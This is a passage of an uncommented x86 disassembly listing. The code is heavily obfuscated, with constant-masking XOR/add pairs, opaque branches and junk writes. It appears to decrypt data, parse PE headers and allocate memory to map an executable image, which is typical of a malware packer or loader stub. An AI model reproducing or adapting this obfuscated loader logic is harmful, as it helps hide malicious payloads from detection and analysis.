  4270d2:	mov    cl,0xa
  4270d4:	sub    cl,al
  4270d6:	add    dl,cl
  4270d8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270db:	xor    cl,0xaf
  4270de:	sub    cl,0xa
  4270e1:	ror    dl,cl
  4270e3:	xor    eax,eax
  4270e5:	mov    eax,DWORD PTR [ebp+0x8]
  4270e8:	mov    ecx,DWORD PTR [ebp-0xc]
  4270eb:	mov    BYTE PTR [eax+ecx*1],dl
  4270ee:	mov    eax,DWORD PTR [ebp+0x8]
  4270f1:	mov    ecx,DWORD PTR [ebp-0x10]
  4270f4:	sub    eax,edi
  4270f6:	xor    eax,esi
  4270f8:	cmp    eax,ecx
  4270fa:	jne    0x42711d
  4270fc:	mov    eax,DWORD PTR [ebp+0x10]
  4270ff:	mov    ecx,DWORD PTR [ebp+0xc]
  427102:	xor    eax,esi
  427104:	xor    ecx,esi
  427106:	sub    eax,ecx
  427108:	mov    ecx,DWORD PTR [ebp-0x20]
  42710b:	sub    eax,edi
  42710d:	xor    eax,esi
  42710f:	mov    DWORD PTR [ebp+0x10],eax
  427112:	mov    eax,DWORD PTR [ebp+0xc]
  427115:	xor    eax,esi
  427117:	sub    ecx,eax
  427119:	sub    ecx,edi
  42711b:	jmp    0x42712c
  42711d:	mov    eax,DWORD PTR [ebp+0xc]
  427120:	xor    eax,esi
  427122:	mov    ecx,0xffcd8d0a
  427127:	sub    ecx,eax
  427129:	add    ecx,DWORD PTR [ebp+0x8]
  42712c:	mov    DWORD PTR [ebp+0x8],ecx
  42712f:	mov    eax,DWORD PTR [ebp+0x10]
  427132:	cmp    eax,ebx
  427134:	jne    0x427032
  42713a:	mov    eax,DWORD PTR [ebp-0x24]
  42713d:	jmp    0x427142
  42713f:	mov    eax,DWORD PTR [ebp-0x4]
  427142:	xor    eax,esi
  427144:	add    eax,edi
  427146:	pop    edi
  427147:	pop    esi
  427148:	pop    ebx
  427149:	leave  
  42714a:	ret    0xc
  42714d:	push   ebp
  42714e:	mov    ebp,esp
  427150:	sub    esp,0x420
  427156:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  42715d:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  427164:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  42716b:	push   ebx
  42716c:	mov    DWORD PTR [ebp-0x1c],0xf89c85a6
  427173:	mov    eax,DWORD PTR [ebp-0x14]
  427176:	push   esi
  427177:	mov    esi,0x75108af
  42717c:	push   edi
  42717d:	xor    eax,esi
  42717f:	mov    edi,0x3272f6
  427184:	add    eax,edi
  427186:	mov    DWORD PTR [ebp-0x8],eax
  427189:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  427190:	mov    DWORD PTR [ebp-0x4],0xead71885
  427197:	mov    DWORD PTR [ebp-0x10],0x8
  42719e:	mov    ecx,ecx
  4271a0:	mov    eax,DWORD PTR [ebp-0xc]
  4271a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4271a6:	xor    eax,esi
  4271a8:	xor    ecx,esi
  4271aa:	add    eax,edi
  4271ac:	add    ecx,edi
  4271ae:	imul   eax,ecx
  4271b1:	jmp    0x4271e4
  4271b3:	mov    eax,DWORD PTR [ebp-0x4]
  4271b6:	sub    eax,edi
  4271b8:	xor    eax,esi
  4271ba:	mov    DWORD PTR [ebp-0x8],eax
  4271bd:	lea    ebx,[ebp-0x8]
  4271c0:	call   0x426f05
  4271c5:	mov    DWORD PTR [ebp-0x8],eax
  4271c8:	mov    eax,DWORD PTR [ebp-0x8]
  4271cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4271ce:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4271d5:	mov    eax,DWORD PTR [ebp-0xc]
  4271d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4271db:	xor    eax,esi
  4271dd:	lea    eax,[eax+ecx*1+0x3272f6]
  4271e4:	mov    DWORD PTR [ebp-0x4],eax
  4271e7:	mov    eax,DWORD PTR [ebp-0x18]
  4271ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4271ed:	xor    ecx,esi
  4271ef:	xor    eax,esi
  4271f1:	sub    eax,ecx
  4271f3:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f6:	cmp    ecx,eax
  4271f8:	jbe    0x4271b3
  4271fa:	mov    eax,DWORD PTR [ebp-0x1c]
  4271fd:	xor    eax,esi
  4271ff:	add    eax,edi
  427201:	mov    DWORD PTR [ebp-0x8],eax
  427204:	mov    DWORD PTR [ebp-0x18],0xf89c86a6
  42720b:	mov    ebx,ebx
  42720d:	jmp    0x427270
  42720f:	mov    ecx,DWORD PTR [ebp-0x20]
  427212:	mov    eax,DWORD PTR [ebp-0x8]
  427215:	xor    ecx,esi
  427217:	add    ecx,edi
  427219:	shr    eax,cl
  42721b:	mov    DWORD PTR [ebp-0x4],eax
  42721e:	mov    eax,DWORD PTR [ebp+0x8]
  427221:	mov    cl,BYTE PTR [eax]
  427223:	mov    BYTE PTR [ebp+0xb],cl
  427226:	mov    cl,BYTE PTR [ebp+0xb]
  427229:	mov    edx,DWORD PTR [ebp-0x8]
  42722c:	movzx  ecx,cl
  42722f:	xor    ecx,edx
  427231:	mov    DWORD PTR [ebp+0x8],ecx
  427234:	mov    ecx,DWORD PTR [ebp-0x18]
  427237:	mov    edx,DWORD PTR [ebp+0x8]
  42723a:	xor    ecx,esi
  42723c:	add    ecx,edi
  42723e:	and    ecx,edx
  427240:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  427247:	mov    edx,DWORD PTR [ebp-0x4]
  42724a:	xor    ecx,edx
  42724c:	mov    DWORD PTR [ebp-0x8],ecx
  42724f:	mov    ecx,DWORD PTR [ebp-0xc]
  427252:	xor    ecx,esi
  427254:	lea    eax,[eax+ecx*1+0x3272f6]
  42725b:	mov    DWORD PTR [ebp+0x8],eax
  42725e:	mov    eax,DWORD PTR [ebp-0xc]
  427261:	xor    eax,esi
  427263:	mov    ecx,0xffcd8d0a
  427268:	sub    ecx,eax
  42726a:	add    ecx,DWORD PTR [ebp-0x10]
  42726d:	mov    DWORD PTR [ebp-0x10],ecx
  427270:	mov    eax,DWORD PTR [ebp-0x14]
  427273:	mov    ecx,DWORD PTR [ebp-0x10]
  427276:	xor    eax,esi
  427278:	add    eax,edi
  42727a:	cmp    ecx,eax
  42727c:	jne    0x42720f
  42727e:	mov    eax,DWORD PTR [ebp-0x1c]
  427281:	mov    ecx,DWORD PTR [ebp-0x8]
  427284:	xor    eax,esi
  427286:	add    eax,edi
  427288:	pop    edi
  427289:	pop    esi
  42728a:	xor    eax,ecx
  42728c:	pop    ebx
  42728d:	leave  
  42728e:	ret    0x4
  427291:	push   ebp
  427292:	mov    ebp,esp
  427294:	mov    eax,DWORD PTR [ebp+0x1c]
  427297:	mov    ecx,DWORD PTR [ebp+0x8]
  42729a:	mov    edx,DWORD PTR [ebp+0x10]
  42729d:	mov    eax,DWORD PTR [eax+0x190]
  4272a3:	mov    eax,DWORD PTR [eax]
  4272a5:	sub    esp,0x64
  4272a8:	push   ebx
  4272a9:	push   esi
  4272aa:	push   edi
  4272ab:	mov    edi,0x75108af
  4272b0:	xor    ecx,edi
  4272b2:	mov    ebx,0x3272f6
  4272b7:	add    ecx,ebx
  4272b9:	cmp    ecx,edx
  4272bb:	jne    0x4272cc
  4272bd:	or     DWORD PTR ds:0x3750c3f,0x4263eb2e
  4272c7:	jmp    0x4277c8
  4272cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4272cf:	mov    esi,DWORD PTR [ebp+0x14]
  4272d2:	mov    edx,DWORD PTR [esi]
  4272d4:	xor    ecx,edi
  4272d6:	add    ecx,ebx
  4272d8:	cmp    edx,ecx
  4272da:	je     0x427783
  4272e0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4272e3:	mov    DWORD PTR [ebp-0x1c],eax
  4272e6:	mov    DWORD PTR [ebp+0x1c],ecx
  4272e9:	mov    ecx,DWORD PTR [ebp+0x18]
  4272ec:	mov    eax,DWORD PTR [esi]
  4272ee:	mov    DWORD PTR [ebp-0x20],eax
  4272f1:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4272f8:	mov    edx,0xf89c85a4
  4272fd:	mov    DWORD PTR [ebp-0x8],edx
  427300:	mov    eax,DWORD PTR [ebp+0x1c]
  427303:	mov    DWORD PTR [ebp+0x1c],eax
  427306:	mov    eax,DWORD PTR [ebp+0x1c]
  427309:	mov    eax,DWORD PTR [eax+0x190]
  42730f:	mov    eax,DWORD PTR [eax]
  427311:	mov    DWORD PTR [ebp-0x24],ecx
  427314:	mov    ecx,DWORD PTR [ebp+0x1c]
  427317:	mov    ecx,DWORD PTR [ecx+0x190]
  42731d:	mov    ecx,DWORD PTR [ecx]
  42731f:	add    ecx,DWORD PTR [eax+0x3c]
  427322:	mov    DWORD PTR [ebp+0x10],ecx
  427325:	mov    eax,DWORD PTR [ebp+0x8]
  427328:	xor    eax,edi
  42732a:	add    eax,ebx
  42732c:	mov    DWORD PTR [ebp-0x4],eax
  42732f:	mov    eax,DWORD PTR [ebp+0x8]
  427332:	xor    eax,edi
  427334:	add    eax,ebx
  427336:	mov    DWORD PTR [ebp+0x18],eax
  427339:	mov    eax,DWORD PTR [ebp+0x10]
  42733c:	mov    eax,DWORD PTR [eax+0x50]
  42733f:	sub    eax,0xc
  427342:	mov    DWORD PTR [ebp-0x28],eax
  427345:	mov    eax,DWORD PTR [ebp+0x10]
  427348:	mov    eax,DWORD PTR [eax+0x38]
  42734b:	mov    ecx,DWORD PTR [ebp+0x10]
  42734e:	dec    eax
  42734f:	test   DWORD PTR [ecx+0x54],eax
  427352:	mov    eax,DWORD PTR [ebp+0x10]
  427355:	je     0x42736f
  427357:	mov    eax,DWORD PTR [eax+0x38]
  42735a:	mov    ecx,DWORD PTR [ebp+0x10]
  42735d:	mov    ecx,DWORD PTR [ecx+0x54]
  427360:	dec    eax
  427361:	not    eax
  427363:	and    ecx,eax
  427365:	mov    eax,DWORD PTR [ebp+0x10]
  427368:	mov    eax,DWORD PTR [eax+0x38]
  42736b:	add    eax,ecx
  42736d:	jmp    0x427372
  42736f:	mov    eax,DWORD PTR [eax+0x54]
  427372:	mov    DWORD PTR [ebp+0x1c],eax
  427375:	mov    eax,DWORD PTR [ebp+0x8]
  427378:	xor    eax,edi
  42737a:	add    eax,ebx
  42737c:	mov    DWORD PTR [ebp+0x18],eax
  42737f:	mov    eax,DWORD PTR [ebp+0x8]
  427382:	xor    eax,edi
  427384:	add    eax,ebx
  427386:	mov    DWORD PTR [ebp+0x18],eax
  427389:	mov    eax,DWORD PTR [ebp+0x8]
  42738c:	mov    ecx,DWORD PTR [ebp-0x24]
  42738f:	xor    eax,edi
  427391:	add    eax,ebx
  427393:	mov    DWORD PTR [ecx],eax
  427395:	mov    DWORD PTR [ebp+0x18],edx
  427398:	mov    DWORD PTR [ebp+0x18],0xf89c85a3
  42739f:	mov    DWORD PTR [ebp+0x18],0xf89c85a2
  4273a6:	mov    DWORD PTR [ebp+0x18],0xf89c85a1
  4273ad:	mov    eax,DWORD PTR [ebp-0x8]
  4273b0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4273b3:	xor    eax,edi
  4273b5:	add    eax,ebx
  4273b7:	imul   eax,ecx
  4273ba:	mov    ecx,DWORD PTR [ebp+0x8]
  4273bd:	mov    edx,DWORD PTR [ebp-0x28]
  4273c0:	xor    ecx,edi
  4273c2:	lea    ecx,[ecx+edx*1+0x3272f6]
  4273c9:	cmp    eax,ecx
  4273cb:	jae    0x42777c
  4273d1:	mov    eax,DWORD PTR [ebp+0x8]
  4273d4:	xor    eax,edi
  4273d6:	add    eax,ebx
  4273d8:	mov    DWORD PTR [ebp+0x18],eax
  4273db:	mov    eax,DWORD PTR [ebp+0x1c]
  4273de:	add    eax,DWORD PTR [ebp-0x1c]
  4273e1:	mov    DWORD PTR [ebp-0x4],eax
  4273e4:	push   DWORD PTR [ebp-0x4]
  4273e7:	mov    esi,DWORD PTR [ebp-0x1c]
  4273ea:	mov    ecx,DWORD PTR [ebp+0x10]
  4273ed:	call   0x42653d
  4273f2:	mov    DWORD PTR [ebp+0xc],eax
  4273f5:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4273fc:	mov    eax,DWORD PTR [ebp-0x18]
  4273ff:	xor    eax,edi
  427401:	lea    ecx,[ebp-0x40]
  427404:	add    eax,ebx
  427406:	push   ecx
  427407:	call   0x426ad1
  42740c:	mov    eax,DWORD PTR [ebp+0xc]
  42740f:	test   eax,eax
  427411:	je     0x427461
  427413:	mov    eax,DWORD PTR [ebp-0x18]
  427416:	xor    eax,edi
  427418:	add    eax,ebx
  42741a:	push   eax
  42741b:	push   DWORD PTR [ebp+0xc]
  42741e:	lea    eax,[ebp-0x40]
  427421:	push   eax
  427422:	call   0x4269c7
  427427:	mov    eax,DWORD PTR [ebp-0x4]
  42742a:	mov    DWORD PTR [ebp-0x18],eax
  42742d:	mov    eax,DWORD PTR [ebp-0x18]
  427430:	mov    ecx,DWORD PTR [ebp-0x1c]
  427433:	sub    eax,ecx
  427435:	mov    DWORD PTR [ebp-0x18],eax
  427438:	mov    eax,DWORD PTR [ebp+0xc]
  42743b:	mov    ecx,DWORD PTR [ebp+0xc]
  42743e:	mov    eax,DWORD PTR [eax+0x10]
  427441:	add    eax,DWORD PTR [ecx+0xc]
  427444:	mov    ecx,DWORD PTR [ebp-0x18]
  427447:	cmp    ecx,eax
  427449:	jb     0x427461
  42744b:	mov    eax,DWORD PTR [ebp+0xc]
  42744e:	mov    eax,DWORD PTR [eax+0xc]
  427451:	mov    ecx,DWORD PTR [ebp+0xc]
  427454:	add    eax,DWORD PTR [ecx+0x8]
  427457:	mov    ecx,DWORD PTR [ebp-0x18]
  42745a:	sub    eax,ecx
  42745c:	jmp    0x42774f
  427461:	push   0xc
  427463:	push   DWORD PTR [ebp-0x4]
  427466:	lea    eax,[ebp-0x4c]
  427469:	push   eax
  42746a:	call   0x4269c7
  42746f:	mov    eax,0xf89c85a5
  427474:	mov    DWORD PTR [ebp-0x2c],eax
  427477:	mov    DWORD PTR [ebp-0x30],0xf89c85a4
  42747e:	mov    DWORD PTR [ebp-0x34],0xf89c85a3
  427485:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  42748c:	lea    ecx,[ebp-0x2c]
  42748f:	mov    DWORD PTR [ebp-0xc],ecx
  427492:	lea    ecx,[ebp-0x30]
  427495:	mov    DWORD PTR [ebp-0x10],ecx
  427498:	lea    ecx,[ebp-0x34]
  42749b:	mov    DWORD PTR [ebp+0xc],ecx
  42749e:	lea    ecx,[ebp-0x38]
  4274a1:	mov    DWORD PTR [ebp-0x14],ecx
  4274a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4274a7:	xor    ecx,edi
  4274a9:	add    ecx,ebx
  4274ab:	mov    DWORD PTR [ebp-0x18],ecx
  4274ae:	jmp    0x4276aa
  4274b3:	cmp    eax,0xf89c85a3
  4274b8:	je     0x4276bc
  4274be:	mov    ecx,DWORD PTR [ebp-0x8]
  4274c1:	xor    ecx,edi
  4274c3:	mov    esi,eax
  4274c5:	add    ecx,ebx
  4274c7:	mov    DWORD PTR [ebp+0x18],ecx
  4274ca:	mov    eax,DWORD PTR [ebp-0x18]
  4274cd:	xor    esi,edi
  4274cf:	lea    eax,[eax+esi*1+0x3272f6]
  4274d6:	mov    DWORD PTR [ebp-0x18],eax
  4274d9:	mov    eax,DWORD PTR [ebp-0x8]
  4274dc:	mov    ecx,DWORD PTR [ebp-0x18]
  4274df:	xor    eax,edi
  4274e1:	add    eax,ebx
  4274e3:	cmp    ecx,eax
  4274e5:	jne    0x4274fa
  4274e7:	mov    eax,DWORD PTR [ebp+0x8]
  4274ea:	xor    eax,edi
  4274ec:	add    eax,ebx
  4274ee:	push   eax
  4274ef:	push   0xc
  4274f1:	lea    eax,[ebp-0x4c]
  4274f4:	push   eax
  4274f5:	call   0x426fad
  4274fa:	mov    eax,DWORD PTR [ebp-0xc]
  4274fd:	mov    eax,DWORD PTR [eax]
  4274ff:	xor    eax,edi
  427501:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427508:	mov    ecx,DWORD PTR [ebp+0x8]
  42750b:	xor    ecx,edi
  42750d:	movzx  eax,al
  427510:	add    ecx,ebx
  427512:	cmp    eax,ecx
  427514:	je     0x427692
  42751a:	mov    eax,DWORD PTR [ebp-0x10]
  42751d:	mov    eax,DWORD PTR [eax]
  42751f:	xor    eax,edi
  427521:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427528:	mov    ecx,DWORD PTR [ebp+0x8]
  42752b:	xor    ecx,edi
  42752d:	movzx  eax,al
  427530:	add    ecx,ebx
  427532:	cmp    eax,ecx
  427534:	je     0x427692
  42753a:	mov    eax,DWORD PTR [ebp+0xc]
  42753d:	mov    eax,DWORD PTR [eax]
  42753f:	xor    eax,edi
  427541:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427548:	mov    ecx,DWORD PTR [ebp+0x8]
  42754b:	xor    ecx,edi
  42754d:	movzx  eax,al
  427550:	add    ecx,ebx
  427552:	cmp    eax,ecx
  427554:	je     0x427692
  42755a:	mov    eax,DWORD PTR [ebp-0x14]
  42755d:	mov    eax,DWORD PTR [eax]
  42755f:	xor    eax,edi
  427561:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427568:	mov    ecx,DWORD PTR [ebp+0x8]
  42756b:	xor    ecx,edi
  42756d:	movzx  eax,al
  427570:	add    ecx,ebx
  427572:	cmp    eax,ecx
  427574:	je     0x427692
  42757a:	mov    eax,DWORD PTR [ebp-0x10]
  42757d:	mov    eax,DWORD PTR [eax]
  42757f:	xor    eax,edi
  427581:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427588:	mov    ecx,DWORD PTR [ebp-0xc]
  42758b:	mov    ecx,DWORD PTR [ecx]
  42758d:	xor    ecx,edi
  42758f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  427596:	xor    al,cl
  427598:	mov    ecx,DWORD PTR [ebp+0xc]
  42759b:	mov    ecx,DWORD PTR [ecx]
  42759d:	xor    ecx,edi
  42759f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275a6:	or     al,cl
  4275a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4275ab:	mov    ecx,DWORD PTR [ecx]
  4275ad:	xor    ecx,edi
  4275af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275b6:	cmp    cl,al
  4275b8:	jne    0x427692
  4275be:	mov    eax,DWORD PTR [ebp+0xc]
  4275c1:	mov    eax,DWORD PTR [eax]
  4275c3:	xor    eax,edi
  4275c5:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  4275cc:	mov    ecx,DWORD PTR [ebp-0x10]
  4275cf:	mov    ecx,DWORD PTR [ecx]
  4275d1:	xor    ecx,edi
  4275d3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275da:	xor    al,cl
  4275dc:	mov    ecx,DWORD PTR [ebp-0x14]
  4275df:	mov    ecx,DWORD PTR [ecx]
  4275e1:	xor    ecx,edi
  4275e3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275ea:	or     al,cl
  4275ec:	mov    ecx,DWORD PTR [ebp-0x10]
  4275ef:	mov    ecx,DWORD PTR [ecx]
  4275f1:	xor    ecx,edi
  4275f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275fa:	cmp    cl,al
  4275fc:	jne    0x427692
  427602:	mov    eax,DWORD PTR [ebp-0x14]
  427605:	mov    eax,DWORD PTR [eax]
  427607:	xor    eax,edi
  427609:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427610:	mov    ecx,DWORD PTR [ebp+0xc]
  427613:	mov    ecx,DWORD PTR [ecx]
  427615:	xor    ecx,edi
  427617:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42761e:	xor    al,cl
  427620:	mov    ecx,DWORD PTR [ebp-0xc]
  427623:	mov    ecx,DWORD PTR [ecx]
  427625:	xor    ecx,edi
  427627:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42762e:	or     al,cl
  427630:	mov    ecx,DWORD PTR [ebp+0xc]
  427633:	mov    ecx,DWORD PTR [ecx]
  427635:	xor    ecx,edi
  427637:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42763e:	cmp    cl,al
  427640:	jne    0x427692
  427642:	mov    eax,DWORD PTR [ebp-0x14]
  427645:	mov    eax,DWORD PTR [eax]
  427647:	xor    eax,edi
  427649:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427650:	mov    ecx,DWORD PTR [ebp-0xc]
  427653:	mov    ecx,DWORD PTR [ecx]
  427655:	xor    ecx,edi
  427657:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42765e:	xor    al,cl
  427660:	mov    ecx,DWORD PTR [ebp-0x10]
  427663:	mov    ecx,DWORD PTR [ecx]
  427665:	xor    ecx,edi
  427667:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42766e:	or     al,cl
  427670:	mov    ecx,DWORD PTR [ebp-0x14]
  427673:	mov    ecx,DWORD PTR [ecx]
  427675:	xor    ecx,edi
  427677:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42767e:	cmp    cl,al
  427680:	jne    0x427692
  427682:	lea    eax,[ebp-0x4c]
  427685:	push   eax
  427686:	call   0x42714d
  42768b:	mov    ecx,DWORD PTR [ebp-0x44]
  42768e:	cmp    eax,ecx
  427690:	je     0x42769c
  427692:	mov    eax,DWORD PTR [ebp+0x8]
  427695:	xor    eax,edi
  427697:	add    eax,ebx
  427699:	mov    DWORD PTR [ebp+0x18],eax
  42769c:	mov    eax,DWORD PTR [ebp-0x8]
  42769f:	xor    eax,edi
  4276a1:	lea    eax,[eax+esi*1+0x3272f6]
  4276a8:	xor    eax,edi
  4276aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4276ad:	mov    edx,DWORD PTR [ebp+0x18]
  4276b0:	xor    ecx,edi
  4276b2:	add    ecx,ebx
  4276b4:	cmp    edx,ecx
  4276b6:	je     0x4274b3
  4276bc:	mov    eax,DWORD PTR [ebp+0x8]
  4276bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4276c2:	xor    eax,edi
  4276c4:	add    eax,ebx
  4276c6:	cmp    ecx,eax
  4276c8:	jne    0x4276db
  4276ca:	mov    eax,DWORD PTR [ebp-0x8]
  4276cd:	mov    ecx,DWORD PTR [ebp+0x1c]
  4276d0:	xor    eax,edi
  4276d2:	lea    eax,[eax+ecx*1+0x3272f6]
  4276d9:	jmp    0x427752
  4276db:	push   0x18
  4276dd:	push   DWORD PTR [ebp-0x4]
  4276e0:	lea    eax,[ebp-0x64]
  4276e3:	push   eax
  4276e4:	call   0x4269c7
  4276e9:	mov    eax,DWORD PTR [ebp+0x8]
  4276ec:	mov    ecx,DWORD PTR [ebp-0x18]
  4276ef:	xor    eax,edi
  4276f1:	add    eax,ebx
  4276f3:	cmp    eax,ecx
  4276f5:	je     0x42770a
  4276f7:	mov    eax,DWORD PTR [ebp+0x8]
  4276fa:	xor    eax,edi
  4276fc:	add    eax,ebx
  4276fe:	push   eax
  4276ff:	push   0x18
  427701:	lea    eax,[ebp-0x64]
  427704:	push   eax
  427705:	call   0x426fad
  42770a:	mov    eax,DWORD PTR [ebp-0x4]
  42770d:	add    eax,0x18
  427710:	mov    DWORD PTR [ebp+0x18],eax
  427713:	push   DWORD PTR [ebp-0x50]
  427716:	push   DWORD PTR [ebp+0x18]
  427719:	mov    eax,DWORD PTR [ebp-0x54]
  42771c:	add    eax,DWORD PTR [ebp-0x20]
  42771f:	push   eax
  427720:	call   0x4269c7
  427725:	mov    eax,DWORD PTR [ebp+0x8]
  427728:	mov    ecx,DWORD PTR [ebp-0x18]
  42772b:	xor    eax,edi
  42772d:	add    eax,ebx
  42772f:	cmp    eax,ecx
  427731:	je     0x427744
  427733:	push   0x0
  427735:	push   DWORD PTR [ebp-0x50]
  427738:	mov    eax,DWORD PTR [ebp-0x54]
  42773b:	add    eax,DWORD PTR [ebp-0x20]
  42773e:	push   eax
  42773f:	call   0x426fad
  427744:	mov    eax,DWORD PTR [ebp-0x24]
  427747:	mov    ecx,DWORD PTR [ebp-0x50]
  42774a:	add    DWORD PTR [eax],ecx
  42774c:	mov    eax,DWORD PTR [ebp-0x50]
  42774f:	add    eax,DWORD PTR [ebp+0x1c]
  427752:	mov    DWORD PTR [ebp+0x1c],eax
  427755:	mov    eax,DWORD PTR [ebp-0x8]
  427758:	mov    ecx,DWORD PTR [ebp+0x1c]
  42775b:	xor    eax,edi
  42775d:	add    eax,ebx
  42775f:	imul   eax,ecx
  427762:	mov    ecx,DWORD PTR [ebp+0x8]
  427765:	mov    edx,DWORD PTR [ebp-0x28]
  427768:	xor    ecx,edi
  42776a:	lea    ecx,[ecx+edx*1+0x3272f6]
  427771:	cmp    eax,ecx
  427773:	jb     0x4273d1
  427779:	mov    esi,DWORD PTR [ebp+0x14]
  42777c:	mov    eax,DWORD PTR [ebp-0x20]
  42777f:	mov    DWORD PTR [esi],eax
  427781:	jmp    0x4277c8
  427783:	mov    ecx,DWORD PTR [ebp+0x8]
  427786:	mov    edx,DWORD PTR [ebp+0xc]
  427789:	xor    ecx,edi
  42778b:	xor    edx,edi
  42778d:	add    ecx,ebx
  42778f:	add    edx,ebx
  427791:	cmp    ecx,edx
  427793:	jne    0x4277a7
  427795:	mov    eax,ds:0x7f642dde
  42779a:	imul   eax,eax,0x9f15fccf
  4277a0:	mov    ds:0x7f642dde,eax
  4277a5:	jmp    0x4277c8
  4277a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4277aa:	xor    ecx,edi
  4277ac:	add    ecx,ebx
  4277ae:	cmp    eax,ecx
  4277b0:	je     0x4277be
  4277b2:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  4277bc:	jmp    0x4277c8
  4277be:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  4277c8:	pop    edi
  4277c9:	pop    esi
  4277ca:	pop    ebx
  4277cb:	leave  
  4277cc:	ret    0x18
  4277cf:	push   ebp
  4277d0:	mov    ebp,esp
  4277d2:	and    esp,0xfffffff8
  4277d5:	mov    eax,DWORD PTR [ebp+0x20]
  4277d8:	sub    esp,0x14
  4277db:	push   ebx
  4277dc:	mov    ebx,DWORD PTR [ebp+0x14]
  4277df:	push   esi
  4277e0:	push   edi
  4277e1:	cmp    eax,0xf89c85a5
  4277e6:	jne    0x4277f2
  4277e8:	push   0xf89c85a4
  4277ed:	jmp    0x427924
  4277f2:	mov    eax,DWORD PTR [ebp+0x20]
  4277f5:	cmp    eax,0xf89c85a4
  4277fa:	jne    0x427806
  4277fc:	push   0xf89c85a3
  427801:	jmp    0x427924
  427806:	mov    eax,DWORD PTR [ebp+0x20]
  427809:	cmp    eax,0xf89c85a3
  42780e:	jne    0x42781a
  427810:	push   0xf89c85a2
  427815:	jmp    0x427924
  42781a:	mov    eax,DWORD PTR [ebp+0x20]
  42781d:	cmp    eax,0xf89c85a2
  427822:	jne    0x42782e
  427824:	push   0xf89c85a1
  427829:	jmp    0x427924
  42782e:	mov    ecx,DWORD PTR [ebp+0x20]
  427831:	mov    eax,0xf89c85be
  427836:	cmp    ecx,eax
  427838:	jne    0x4278f4
  42783e:	mov    eax,DWORD PTR [ebp+0x10]
  427841:	mov    DWORD PTR [esp+0xc],eax
  427845:	mov    eax,DWORD PTR [ebp+0x18]
  427848:	mov    DWORD PTR [esp+0x14],eax
  42784c:	mov    eax,DWORD PTR [ebp+0xc]
  42784f:	mov    DWORD PTR [esp+0x18],eax
  427853:	mov    eax,DWORD PTR [ebp+0x8]
  427856:	mov    DWORD PTR [esp+0x10],eax
  42785a:	mov    eax,DWORD PTR [esp+0x10]
  42785e:	mov    ecx,DWORD PTR [esp+0x14]
  427862:	mov    edi,0x75108af
  427867:	xor    eax,edi
  427869:	mov    esi,0x3272f6
  42786e:	add    eax,esi
  427870:	mov    DWORD PTR [ecx],eax
  427872:	mov    eax,DWORD PTR [esp+0xc]
  427876:	mov    eax,DWORD PTR [eax+0x194]
  42787c:	mov    ecx,DWORD PTR [eax]
  42787e:	mov    eax,DWORD PTR [esp+0xc]
  427882:	mov    eax,DWORD PTR [eax+0x194]
  427888:	mov    eax,DWORD PTR [eax]
  42788a:	add    eax,DWORD PTR [ecx+0x3c]
  42788d:	mov    ecx,DWORD PTR [esp+0xc]
  427891:	mov    ecx,DWORD PTR [ecx+0x1e0]
  427897:	mov    ecx,DWORD PTR [ecx+0x14]
  42789a:	push   0x4
  42789c:	push   0x3000
  4278a1:	push   DWORD PTR [eax+0x50]
  4278a4:	push   0x0
  4278a6:	call   ecx
  4278a8:	mov    DWORD PTR [ebx],eax
  4278aa:	mov    eax,DWORD PTR [esp+0x10]
  4278ae:	push   DWORD PTR [esp+0xc]
  4278b2:	xor    eax,edi
  4278b4:	add    eax,esi
  4278b6:	mov    DWORD PTR [esp+0x20],eax
  4278ba:	lea    eax,[esp+0x20]
  4278be:	push   eax
  4278bf:	push   ebx
  4278c0:	push   DWORD PTR [esp+0x20]
  4278c4:	push   DWORD PTR [esp+0x28]
  4278c8:	push   DWORD PTR [esp+0x24]
  4278cc:	call   0x427291
  4278d1:	mov    eax,DWORD PTR [esp+0x10]
  4278d5:	mov    ecx,DWORD PTR [ebx]
  4278d7:	xor    eax,edi
  4278d9:	add    eax,esi
  4278db:	cmp    ecx,eax
  4278dd:	je     0x42793b
  4278df:	mov    eax,DWORD PTR [esp+0x18]
